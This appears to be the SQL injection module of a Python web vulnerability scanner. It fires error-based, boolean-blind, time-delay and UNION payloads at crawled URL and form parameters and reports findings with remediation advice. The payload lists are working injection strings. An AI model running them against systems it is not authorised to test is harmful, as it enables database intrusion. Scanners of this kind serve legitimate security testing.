import re
import time
from urllib.parse import parse_qs, urlparse, urlunparse

from modules.base import BaseModule
from modules.evidence import context_excerpt, new_regex_evidence


class SqliModule(BaseModule):
    NAME = "sqli"
    DESCRIPTION = "SQL Injection testing - error, boolean-blind, time-based, union"
    ERROR_PAYLOADS = [
        "'",
        "''",
        "`",
        '"',
        "\\",
        "')",
        "') OR ('1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "' OR 1=1--",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 100--",
        "1 AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))",
        "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,0x3a,FLOOR(RAND(0)*2))x "
        "FROM information_schema.tables GROUP BY x)a)",
    ]

    BOOLEAN_PAYLOADS = [
        ("1 AND 1=1", "1 AND 1=2"),
        ("1' AND '1'='1", "1' AND '1'='2"),
        ("1 AND 1=1--", "1 AND 1=2--"),
    ]

    TIME_PAYLOADS = [
        "1; WAITFOR DELAY '0:0:5'--",
        "1; SELECT SLEEP(5)--",
        "1' AND SLEEP(5)--",
        "1 AND SLEEP(5)--",
        "1'; SELECT pg_sleep(5)--",
        "1 AND 1=(SELECT 1 FROM pg_sleep(5))--",
    ]

    UNION_PAYLOADS = [
        "1 UNION SELECT NULL,CONCAT('vulxor_union_',VERSION()),NULL--",
        "1 UNION SELECT NULL,'vulxor_union_'||version(),NULL--",
        "1 UNION SELECT NULL,'vulxor_union_'+@@version,NULL--",
        "1 UNION SELECT NULL,'vulxor_union_'||sqlite_version(),NULL--",
    ]

    DB_ERROR_PATTERNS = [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
        r"valid MySQL result", r"ORA-\d{5}", r"Oracle.*ORA-",
        r"(?:PostgreSQL|Postgres)(?:\s+(?:server|database))?\s+"
        r"(?:ERROR|FATAL|WARNING)\s*:",
        r"PSQLException", r"org\.postgresql\.util\.PSQLException",
        r"SQLite.*Exception", r"SQLite3::",
        r"Microsoft.*SQL.*Server", r"ODBC.*SQL Server",
        r"Unclosed quotation mark", r"SqlException",
        r"Syntax error.*in query", r"mysql_fetch",
        r"SQLITE_ERROR", r"sqlite3.OperationalError",
    ]

    COMMON_PARAMS = ["id", "user", "search", "q", "query", "page", "cat",
                     "item", "product", "lang", "ref", "order", "sort"]

    def run(self):
        self.log.info("[sqli] Probing SQL injection vectors")
        self._test_url_params()
        self._test_form_params()

    def _test_url_params(self):
        for base_url, params in self._url_targets():
            for param in params:
                self._run_error_tests(base_url, param)
                self._run_boolean_tests(base_url, param)
                if self.settings.is_aggressive():
                    self._run_time_tests(base_url, param)
                    self._run_union_tests(base_url, param)

    def _test_form_params(self):
        for form in self._crawl_forms():
            if not form["inputs"]:
                continue
            for name in form["inputs"][:10]:
                self._run_error_tests(form["action"], name, method=form["method"].upper())
                self._run_boolean_tests(form["action"], name, method=form["method"].upper())

        # Fallback: discover forms in the homepage when the crawl module was not run.
        resp = self.get(self.target)
        if not resp:
            return
        actions = re.findall(r'<form[^>]+action=["\']([^"\']*)["\']', resp.text, re.I)
        inputs  = re.findall(r'<input[^>]+name=["\']([^"\']*)["\']', resp.text, re.I)

        for action in actions[:5]:
            for name in inputs[:10]:
                self._run_error_tests(self.url(action), name, method="POST")

    def _run_error_tests(self, url: str, param: str, method: str = "GET"):
        baseline = self._inject(url, param, "vulxor_error_baseline", method)
        if not baseline:
            return
        for payload in self._payloads(self.ERROR_PAYLOADS):
            resp = self._inject(url, param, payload, method)
            evidence = self._new_error(baseline.text, resp.text) if resp else None
            if evidence:
                self.add_finding(
                    severity="HIGH",
                    title="SQL Injection - Error-based",
                    url=url,
                    detail=f"Parameter '{param}' reflects a DB error.",
                    payload=payload,
                    evidence=context_excerpt(resp.text, evidence),
                    remediation="Use parameterised queries / prepared statements.",
                )
                return

    def _run_time_tests(self, url: str, param: str, method: str = "GET"):
        baseline_start = time.monotonic()
        baseline = self._inject(url, param, "vulxor_time_baseline", method)
        baseline_elapsed = time.monotonic() - baseline_start
        if not baseline:
            return
        for payload in self._payloads(self.TIME_PAYLOADS):
            start = time.monotonic()
            resp = self._inject(url, param, payload, method)
            elapsed = time.monotonic() - start
            if resp and elapsed >= max(4.5, baseline_elapsed + 3.5):
                confirm_start = time.monotonic()
                confirm = self._inject(url, param, payload, method)
                confirm_elapsed = time.monotonic() - confirm_start
                if not confirm or confirm_elapsed < max(4.5, baseline_elapsed + 3.5):
                    continue
                self.add_finding(
                    severity="HIGH",
                    title="SQL Injection - Time-based blind",
                    url=url,
                    detail=(f"Parameter '{param}' caused repeatable delays of "
                            f"{elapsed:.1f}s and {confirm_elapsed:.1f}s "
                            f"(baseline {baseline_elapsed:.1f}s)."),
                    payload=payload,
                    remediation="Use parameterised queries / prepared statements.",
                )
                return

    def _run_boolean_tests(self, url: str, param: str, method: str = "GET"):
        baseline = self._inject(url, param, "vulxor_baseline", method)
        if not baseline:
            return

        for true_payload, false_payload in self._payloads(self.BOOLEAN_PAYLOADS):
            true_resp = self._inject(url, param, true_payload, method)
            false_resp = self._inject(url, param, false_payload, method)
            if not true_resp or not false_resp:
                continue

            if self._looks_boolean_diff(baseline, true_resp, false_resp):
                self.add_finding(
                    severity="HIGH",
                    title="SQL Injection - Boolean-based blind",
                    url=url,
                    detail=f"Parameter '{param}' produced a consistent true/false response difference.",
                    payload=f"{true_payload} / {false_payload}",
                    evidence=(
                        f"baseline={self._signature(baseline)} "
                        f"true={self._signature(true_resp)} "
                        f"false={self._signature(false_resp)}"
                    ),
                    remediation="Use parameterised queries / prepared statements.",
                )
                return

    def _run_union_tests(self, url: str, param: str, method: str = "GET"):
        for payload in self._payloads(self.UNION_PAYLOADS):
            resp = self._inject(url, param, payload, method)
            marker = re.search(r"vulxor_union_[^<\s\"']{1,120}", resp.text, re.I) \
                if resp else None
            if marker and marker.group(0).casefold() not in payload.casefold():
                self.add_finding(
                    severity="CRITICAL",
                    title="SQL Injection - UNION-based (version leak)",
                    url=url,
                    detail=f"Parameter '{param}' returned DB version via UNION.",
                    payload=payload,
                    evidence=context_excerpt(resp.text, marker.group(0)),
                    remediation="Use parameterised queries / prepared statements.",
                )
                return

    def _inject(self, url, param, payload, method):
        if method == "GET":
            return self.get(url, params={param: payload})
        return self.post(url, data={param: payload})

    def _url_targets(self):
        targets = []
        crawl = self.results.meta.get("crawl", {})
        for page in crawl.get("pages", []):
            url = page.get("url")
            if url:
                targets.append(url)
        for path in crawl.get("paths", []):
            url = path.get("url")
            if url:
                targets.append(url)
        targets.extend([self.target, f"{self.target}/index.php"])

        seen = set()
        for url in targets[:20]:
            parsed = urlparse(url)
            base_url = urlunparse(parsed._replace(query="", fragment=""))
            if not base_url or base_url in seen:
                continue
            seen.add(base_url)
            query_params = list(parse_qs(parsed.query).keys())
            known_params = query_params or self._page_params(url) or self.COMMON_PARAMS
            yield base_url, known_params

    def _crawl_forms(self):
        crawl = self.results.meta.get("crawl", {})
        forms = []
        for form in crawl.get("forms", []):
            method = form.get("method", "get").lower()
            if method not in ("get", "post"):
                method = "get"
            forms.append({
                "action": form.get("action") or self.target,
                "method": method,
                "inputs": form.get("inputs", []),
            })
        return forms[:20 if self.settings.is_aggressive() else 8]

    def _page_params(self, url):
        crawl = self.results.meta.get("crawl", {})
        for page in crawl.get("pages", []):
            if page.get("url") == url:
                return page.get("params", [])
        return []

    def _looks_boolean_diff(self, baseline, true_resp, false_resp):
        if true_resp.status_code != false_resp.status_code:
            return true_resp.status_code == baseline.status_code
        true_len = len(true_resp.text)
        false_len = len(false_resp.text)
        baseline_len = len(baseline.text)
        if abs(true_len - false_len) < max(80, int(max(true_len, false_len) * 0.08)):
            return False
        return abs(true_len - baseline_len) < abs(false_len - baseline_len)

    def _signature(self, resp):
        return f"{resp.status_code}/{len(resp.text)}"

    def _payloads(self, payloads):
        if self.settings.is_aggressive():
            return payloads
        return payloads[:4]

    def _is_error(self, body: str) -> bool:
        return any(re.search(p, body, re.I) for p in self.DB_ERROR_PATTERNS)

    def _new_error(self, baseline: str, candidate: str):
        return new_regex_evidence(baseline, candidate, self.DB_ERROR_PATTERNS)
